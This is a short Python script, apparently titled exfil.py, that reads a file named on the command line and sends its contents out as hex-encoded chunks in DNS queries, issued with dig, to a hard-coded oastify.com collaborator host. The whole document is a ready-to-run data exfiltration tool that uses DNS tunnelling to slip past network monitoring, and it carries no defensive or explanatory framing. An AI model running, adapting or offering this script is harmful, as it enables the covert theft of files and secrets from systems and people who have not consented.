import sys
import os
import time

if len(sys.argv) != 2:
    print("Usage: python exfil.py <filename>")
    sys.exit(1)

filename = sys.argv[1]

with open(filename, 'rb') as f:
    data = f.read()

# Max label length in DNS is 63 characters, hex is 2 chars per byte, so max 31 bytes per chunk (62 hex chars)
chunk_size = 31

for i in range(0, len(data), chunk_size):
    chunk = data[i:i + chunk_size]
    hex_chunk = chunk.hex()
    cmd = f"dig +short {hex_chunk}.od5y6541dd6fn20zh0hdlr0w2n8ew6kv.oastify.com"
    os.system(cmd)
    time.sleep(0.1)